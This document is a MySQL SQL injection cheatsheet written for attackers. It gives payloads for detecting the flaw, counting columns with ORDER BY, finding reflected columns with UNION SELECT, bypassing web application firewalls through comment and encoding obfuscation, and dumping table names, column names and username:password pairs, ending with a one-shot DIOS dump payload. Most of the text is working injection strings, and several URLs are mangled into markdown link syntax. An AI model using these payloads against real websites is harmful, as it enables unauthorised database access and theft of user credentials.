# MySQL Error-based SQL Injection Cheatsheet

This cheatsheet covers techniques for MySQL error-based SQL injection, allowing attackers to enumerate and extract database information by leveraging SQL error messages.

---

## 1. Detecting the Vulnerability

Try injecting special characters to trigger SQL syntax errors.

* **Test URL:** `http://domain.com/index.php?id=1` (Loads successfully)
* **Inject single quote:** `http://domain.com/index.php?id=1'`
    * **Expected:** Error message like `You have an error in your SQL syntax...`
* **Inject comment:** `http://domain.com/index.php?id=1'-- -`
    * **Expected:** Website might load successfully (comment nullifies rest of query). Space after `--` is often needed.
* **Test arithmetic:** `http://domain.com/index.php?id=2-1`
    * **Expected:** Website shows content for `id=1`.

---

## 2. Bypassing WAF (Detection Phase)

If basic detection fails due to a Web Application Firewall (WAF), try obfuscated comment payloads.

* **Inline Comment Bypass:** `http://domain.com/index.php?id=1'--/**/-`
    * **Expected:** If no WAF warning and the page loads, the vulnerability might exist.
* **Other WAF Bypass Examples (Detection):**
    ```
    [http://domain.com/index.php?id=/*!500001'--+-*/](http://domain.com/index.php?id=/*!500001'--+-*/)
    [http://domain.com/index.php?id=1'--%0A-](http://domain.com/index.php?id=1'--%0A-)
    [http://domain.com/index.php?id=1'--%23foo%0D%0A-](http://domain.com/index.php?id=1'--%23foo%0D%0A-)
    ```

---

## 3. Finding the Number of Columns

Use `ORDER BY` to determine the number of columns in the original query. Increment the number until an error occurs.

* **Basic Payload:**
    ```
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1)' ORDER BY 1-- -
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1)' ORDER BY 2-- -
    ...
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1)' ORDER BY N-- -
    ```
    * **Expected:** No error for numbers up to the actual column count. An error like `Unknown column 'N+1' in 'order clause'` indicates N columns.
* **Tip:** If a valid ID doesn't work, try a non-existent or negative ID (`id=-1`).

* **WAF Bypass Examples (ORDER BY):**
    ```
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1)' /**/ORDER/**/BY/**/ 1-- -
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' /*!order*/+/*!by*/ 1-- -
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1)' /*!50000ORDER BY*/ 1-- -
    [http://domain.com/index.php?id=1%0Aorder%0Aby%0A1--](http://domain.com/index.php?id=1%0Aorder%0Aby%0A1--) -
    ```

---

## 4. Finding the Vulnerable (Displayed) Column

Use `UNION SELECT` with the determined number of columns to find which column's content is reflected on the page.

* **Basic Payload (assuming 4 columns):**
    ```
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT 1,2,3,4-- -
    ```
    * **Expected:** Page loads successfully, displaying one or more numbers (1-4) in the content. The displayed number indicates the vulnerable column index.
* **Using `NULL` (if numbers don't work):**
    ```
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT NULL,NULL,NULL,NULL-- -
    ```
    * If successful, replace `NULL` values one by one with a string (e.g., `'a'`) to find the reflected column.
    * Example: `http://domain.com/index.php?id=-1' UNION SELECT NULL,'a',NULL,NULL-- -`

* **WAF Bypass Examples (UNION SELECT):**
    ```
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1) /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4-- -
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1) +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1) /**//*!50000UNION SELECT*//**/ 1,2,3,4-- -
    [http://domain.com/index.php?id=1](http://domain.com/index.php?id=1) /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -
    ```

* **Forcing Output (If column number isn't displayed):**
    Try forcing the output by modifying the ID parameter:
    * Negative ID: `?id=-1' UNION SELECT ...`
    * Dot prefix: `?id=.1' UNION SELECT ...`
    * Logical operators: `?id=1' AND 0 UNION SELECT ...`
    * Division: `?id=1' DIV 0 UNION SELECT ...`

---

## 5. Retrieving Database Information

Replace the vulnerable column number in the `UNION SELECT` payload with SQL functions or queries to extract data.

* **Database Version:**
    ```
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT 1,version(),3,4-- -
    ```
* **Current Database:**
    ```
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT 1,database(),3,4-- -
    ```
* **List Tables in Current Database:**
    ```sql
    -- Convert database() result to HEX (e.g., 'mydatabase' -> 0x6d796461746162617365)
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=0xHEX_DATABASE_NAME-- -
    ```
* **List Columns in a Table:**
    ```sql
    -- Convert table_name to HEX (e.g., 'users' -> 0x7573657273)
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0xHEX_TABLE_NAME-- -
    ```
* **Dump Data from Columns:**
    ```sql
    -- Example: Dump 'username' and 'password' from 'users' table
    [http://domain.com/index.php?id=-1](http://domain.com/index.php?id=-1)' UNION SELECT 1,group_concat(username,0x3a,password separator 0x3c62723e),3,4 FROM users-- -
    -- Note: 0x3a is ':' and 0x3c62723e is '<br>' HTML tag
    ```

### DIOS (Dump In One Shot) Payloads

These complex payloads attempt to dump the entire database structure in a single query. They are often blocked by WAFs but can be powerful if successful. (Note: Only showing one example for brevity, the original list contains many variations).

```sql
-- Example DIOS payload (insert into the vulnerable column position)
concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/